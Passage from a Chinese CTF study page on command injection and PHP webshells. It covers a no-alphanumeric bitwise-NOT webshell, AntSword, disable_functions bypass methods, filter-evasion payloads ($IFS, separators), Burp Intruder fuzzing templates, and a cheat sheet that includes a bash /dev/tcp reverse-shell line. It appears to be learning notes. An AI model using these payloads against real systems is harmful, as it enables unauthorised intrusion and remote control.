+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>$_=~"..."                变量名只用 $ 和 _,不含字母 ✓
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>${$__}[...]              用变量的值当变量名 → $_POST
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>[~"%9c%92%9b"]           数组下标也可以是取反表达式 → ["cmd"]
+</span></code></pre></div>
+<p><strong><code>$</code>、<code>_</code>、<code>"</code>、<code>(</code>、<code>)</code>、<code>[</code>、<code>]</code>、<code>;</code> 都不是字母数字 → 全部合法。</strong></p>
+<h4 id="_19">过程<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>① 发现字母数字全被封 → 只剩符号可用
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>② 自己写脚本:字符串 → 按位取反 → URL 编码
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>③ 传 phpinfo 查 disable_functions → assert、eval 还在
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>④ 构造一句话木马 → 蚁剑连接
+</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>⑤ 根目录有 flag 但读不了(权限)
+</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>⑥ 旁边有 /readflag(通常是 SUID 程序,专门读 flag)
+</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>⑦ 装蚁剑「绕过 disable_functions」插件
+</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>⑧ 选 PHP 版本、开终端 → whoami / cd 可用,但 /readflag 没反应
+</span></code></pre></div>
+<h4 id="readflag">卡点：<code>/readflag</code> 在蚁剑终端里没输出<a class="headerlink" href="#readflag" title="Permanent link">&para;</a></h4>
+<p><strong>先分清「能用」的含义：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>cd        →  蚁剑自己实现的(PHP 侧改 CWD),不是真命令
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>whoami    →  真的 /usr/bin/whoami 在跑
+</span></code></pre></div>
+<p><strong><code>whoami</code> 有输出 → 外部二进制确实能执行 → 问题在 <code>/readflag</code> 本身。</strong></p>
+<p><strong>最可能：错误信息走 stderr，而终端只显示 stdout。</strong></p>
+<p><strong>诊断命令：</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>ls<span class="w"> </span>-l<span class="w"> </span>/readflag<span class="w">              </span><span class="c1"># 在不在?有没有 SUID(s 位)?</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>id<span class="w">                           </span><span class="c1"># 当前是谁</span>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>/readflag<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w">               </span><span class="c1"># 把 stderr 合并过来</span>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>/readflag<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"EXIT=</span><span class="nv">$?</span><span class="s2">"</span><span class="w">    </span><span class="c1"># 看退出码</span>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>/readflag<span class="w"> </span>&gt;<span class="w"> </span>/tmp/a<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/a<span class="w">   </span><span class="c1"># 落文件再读(最稳)</span>
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s2">"readflag*"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w">  </span><span class="c1"># 路径不对就搜</span>
+</span></code></pre></div>
+<p><strong>退出码对照：</strong></p>
+<table>
+<thead>
+<tr>
+<th>EXIT</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>0</code> 但没输出</td>
+<td>输出被吞 → 用重定向到文件</td>
+</tr>
+<tr>
+<td><code>126</code></td>
+<td>没有执行权限</td>
+</tr>
+<tr>
+<td><code>127</code></td>
+<td>命令找不到</td>
+</tr>
+<tr>
+<td><code>137</code></td>
+<td>被 kill（disable_functions 限制常见）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>权限对照（<code>ls -l</code>）：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>-rwsr-xr-x root root    →  SUID 在,能提权 ✅
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>-rwxr-xr-x              →  没有 SUID,www-data 跑还是 www-data
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>-rw-r--r--              →  根本没有执行权限 → Permission denied
+</span></code></pre></div>
+<h4 id="disable_functions">绕过 disable_functions 的四种技术<a class="headerlink" href="#disable_functions" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>技术</th>
+<th>原理</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>LD_PRELOAD + mail()</strong></td>
+<td>劫持当前进程，加载恶意 .so</td>
+<td>命令跑在本进程里</td>
+</tr>
+<tr>
+<td><strong>PHP-FPM / FastCGI</strong></td>
+<td>起新 worker，<code>disable_functions</code> 为空</td>
+<td>命令跑在新进程里</td>
+</tr>
+<tr>
+<td><strong>Backtrace UAF</strong></td>
+<td>利用 PHP 崩溃绕过</td>
+<td>版本敏感</td>
+</tr>
+<tr>
+<td><strong>Apache Mod_CGI</strong></td>
+<td>借 CGI 环境执行</td>
+<td>需要 Apache + CGI</td>
+</tr>
+</tbody>
+</table>
+<p><strong>不同技术下 <code>id</code> 的结果可能不同 —— 所以第一步永远先跑 <code>id</code>。</strong></p>
+<h4 id="_20">这题的收获<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p><strong>① 字母数字被封 ≠ 写不了代码 —— 按位取反能把任意符号变成任意单词。</strong></p>
+<p><strong>② 有 <code>eval</code> 就够 —— <code>assert($_POST["cmd"])</code> 就是完整的一句话。</strong></p>
+<p><strong>③ 有命令执行 ≠ 能读 flag —— <code>/flag</code> 常常是 0400 root，得靠 SUID 的 <code>/readflag</code>。</strong></p>
+<p><strong>④ 终端里"没反应"先看 stderr 和退出码，别急着换工具。</strong></p>
+</blockquote>
+<hr />
+<h2 id="_21">十一、我踩的坑<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h2>
+<h3 id="1_2">坑 1：全角 <code>￥</code> 不是 <code>$</code><a class="headerlink" href="#1_2" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>❌ ￥IFS      ← 中文输入法打出来的全角符号
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>✅ $IFS       ← 半角
+</span></code></pre></div>
+<p><strong>现象：明明写了 <code>$IFS</code> 却不生效。</strong></p>
+<p><strong>对策：写完检查一下字符宽度；或者在编辑器里用半角输入。</strong></p>
+<h3 id="2ifs">坑 2：<code>$IFS</code> 后面紧跟路径会粘在一起<a class="headerlink" href="#2ifs" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>cat<span class="nv">$IFS</span>/flag<span class="w">        </span>✅
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>cat<span class="nv">$IFSflag</span><span class="w">         </span>❌<span class="w"> </span>变成变量<span class="w"> </span><span class="nv">$IFSflag</span>
+</span></code></pre></div>
+<p><strong>要访问的路径必须以 <code>/</code> 开头,或者用 <code>${IFS}</code>。</strong></p>
+<h3 id="3_1">坑 3：以为 <code>;</code> 不行就放弃了<a class="headerlink" href="#3_1" title="Permanent link">&para;</a></h3>
+<p><strong><code>;</code> 被拦还有 <code>|</code>、<code>||</code>、<code>&amp;&amp;</code>、<code>&amp;</code>、<code>%0a</code>。</strong></p>
+<p><strong>五种分隔符一个一个试,总有能过的。</strong></p>
+<h3 id="4-cat">坑 4：只试了 <code>cat</code>,没试替代品<a class="headerlink" href="#4-cat" title="Permanent link">&para;</a></h3>
+<p><strong><code>cat</code> 被拦？<code>tac</code>、<code>nl</code>、<code>head</code>、<code>sort</code>、<code>od</code> 都能读文件。</strong></p>
+<h3 id="5_1">坑 5：路径被拦就卡住<a class="headerlink" href="#5_1" title="Permanent link">&para;</a></h3>
+<p><strong>用 <code>`ls`</code> 或 <code>$(ls)</code> 让系统自己算文件名,绕开手写路径。</strong></p>
+<p><strong>这一招在"<code>flag</code>、<code>/</code>、<code>/f*</code> 全被拦"时是唯一出路。</strong></p>
+<hr />
+<h2 id="_22">十二、工具与字典<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h2>
+<p><strong>三份原子字典（一行一个，只测"这一个东西"过不过）：</strong></p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>行数</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>01-分隔符.txt</code></strong></td>
+<td>7</td>
+<td><code>;</code> <code>\|</code> <code>\|\|</code> <code>&amp;</code> <code>&amp;&amp;</code> <code>%0a</code> <code>%0d%0a</code></td>
+</tr>
+<tr>
+<td><strong><code>02-关键词.txt</code></strong></td>
+<td>48</td>
+<td>命令名(<code>cat</code> <code>ls</code> <code>id</code> …)和文件名(<code>flag</code> <code>passwd</code> …)</td>
+</tr>
+<tr>
+<td><strong><code>03-符号.txt</code></strong></td>
+<td>26</td>
+<td><code>$IFS</code> <code>${IFS}</code> <code>&lt;</code> <code>&gt;</code> <code>*</code> <code>?</code> <code>(</code> <code>)</code> <code>'</code> <code>"</code> <code>`</code> <code>/</code> <code>%09</code> …</td>
+</tr>
+</tbody>
+</table>
+<p><strong>为什么拆成原子：当过滤很多时，"一整条命令"失败了你不知道是哪个词坏了。一行一个才能一一对上。</strong></p>
+<h3 id="121">12.1 测试模板（关键）<a class="headerlink" href="#121" title="Permanent link">&para;</a></h3>
+<p><strong>字典里只有"一个东西"，测试时把它塞进固定模板：</strong></p>
+<h4 id="_23">测分隔符<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>原始参值:  127.0.0.1
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>模板:      127.0.0.1§§id
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>该行内容</th>
+<th>拼出来</th>
+<th>判断</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>;</code></td>
+<td><code>127.0.0.1;id</code></td>
+<td>出现 <code>uid=</code> → <code>;</code> 可用</td>
+</tr>
+<tr>
+<td><code>\|</code></td>
+<td><code>127.0.0.1\|id</code></td>
+<td>出现 <code>uid=</code> → <code>\|</code> 可用</td>
+</tr>
+<tr>
+<td><code>%0a</code></td>
+<td><code>127.0.0.1%0aid</code></td>
+<td>同上</td>
+</tr>
+</tbody>
+</table>
+<h4 id="_24">测关键词（命令名）<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>模板:      127.0.0.1;§§$IFS/flag
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>该行内容</th>
+<th>拼出来</th>
+<th>判断</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cat</code></td>
+<td><code>;cat$IFS/flag</code></td>
+<td>出 flag → <code>cat</code> 可用</td>
+</tr>
+<tr>
+<td><code>tac</code></td>
+<td><code>;tac$IFS/flag</code></td>
+<td>出 flag → <code>tac</code> 可用（或内容反了）</td>
+</tr>
+</tbody>
+</table>
+<h4 id="_25">测关键词（文件名）<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>模板:      127.0.0.1;cat$IFS/§§
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>该行内容</th>
+<th>拼出来</th>
+<th>判断</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>flag</code></td>
+<td><code>;cat$IFS/flag</code></td>
+<td>出 flag → <code>flag</code> 可用</td>
+</tr>
+<tr>
+<td><code>flag.php</code></td>
+<td><code>;cat$IFS/flag.php</code></td>
+<td>出 flag → 名字对</td>
+</tr>
+</tbody>
+</table>
+<h4 id="_26">测符号 / 空白<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>模板:      127.0.0.1;cat§§/flag
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>该行内容</th>
+<th>拼出来</th>
+<th>判断</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>$IFS</code></td>
+<td><code>;cat$IFS/flag</code></td>
+<td>出 flag → <code>$IFS</code> 可用</td>
+</tr>
+<tr>
+<td><code>&lt;</code></td>
+<td><code>;cat&lt;/flag</code></td>
+<td>出 flag → <code>&lt;</code> 可用</td>
+</tr>
+<tr>
+<td><code>%09</code></td>
+<td><code>;cat%09/flag</code></td>
+<td>出 flag → Tab 可用</td>
+</tr>
+</tbody>
+</table>
+<h3 id="122-burp-intruder">12.2 Burp Intruder 设置<a class="headerlink" href="#122-burp-intruder" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>① 把 § 放在上面模板的 § 位置
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>② Payloads → Load → 选对应的 txt
+</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>③ 不要开 URL-encode（字典里的字符要原样发）
+</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a>④ 按响应长度排序，长度和基线不同的就是"没被拦"
+</span></code></pre></div>
+<p><strong>基线 = 不加任何 payload 的正常响应长度。和基线一样 = 被拦。不一样 = 可能生效。</strong></p>
+<h3 id="123">12.3 判读速查<a class="headerlink" href="#123" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>现象</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>响应长度和基线一样</td>
+<td>这条被拦 / 没生效</td>
+</tr>
+<tr>
+<td>出现 <code>uid=</code></td>
+<td>命令执行了</td>
+</tr>
+<tr>
+<td>出现文件内容</td>
+<td>读成功了</td>
+</tr>
+<tr>
+<td>响应变慢 5 秒</td>
+<td>睡眠生效（盲注用）</td>
+</tr>
+<tr>
+<td>500 / 报错</td>
+<td>语法错或触发了错误处理</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="_27">十三、常用命令速查<a class="headerlink" href="#_27" title="Permanent link">&para;</a></h2>
+<p><strong>拿到命令执行后，你会需要这些：</strong></p>
+<table>
+<thead>
+<tr>
+<th>目的</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>我是谁</td>
+<td><code>whoami</code> / <code>id</code></td>
+</tr>
+<tr>
+<td>系统版本</td>
+<td><code>uname -a</code> / <code>cat /etc/os-release</code></td>
+</tr>
+<tr>
+<td>找 flag</td>
+<td><code>ls /</code> / <code>find / -name "flag*" 2&gt;/dev/null</code></td>
+</tr>
+<tr>
+<td>读文件</td>
+<td><code>cat /flag</code></td>
+</tr>
+<tr>
+<td>看进程</td>
+<td><code>ps aux</code></td>
+</tr>
+<tr>
+<td>看网络</td>
+<td><code>ifconfig</code> / <code>netstat -an</code></td>
+</tr>
+<tr>
+<td>反弹 shell</td>
+<td><code>bash -i &gt;&amp; /dev/tcp/IP/端口 0&gt;&amp;1</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="_28">十四、一句话总结<a class="headerlink" href="#_28" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><strong>命令注入 = 分隔符 + 绕过过滤 + 找输出通道。</strong></p>
+<p><strong>分隔符五种: <code>;</code> <code>|</code> <code>||</code> <code>&amp;&amp;</code> <code>%0a</code>,逐个试。</strong>
+<strong>空格用 <code>$IFS</code>,关键词用引号/通配符拆,路径用 <code>`ls`</code> 让系统算。</strong>
+<strong>没回显就走盲注:时间延迟 → 写文件 → 外带。</strong></p>
+<p><strong>记住 <code>cat$IFS/flag</code> 这个模板 —— 它包含了空格绕过,是所有 payload 的起点。</strong></p>
+</blockquote>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      仅用于个人学习与授权测试记录
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tabs.link", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../../assets/js/bg-video.js"></script>
+      
+    
+  </body>
+</html>
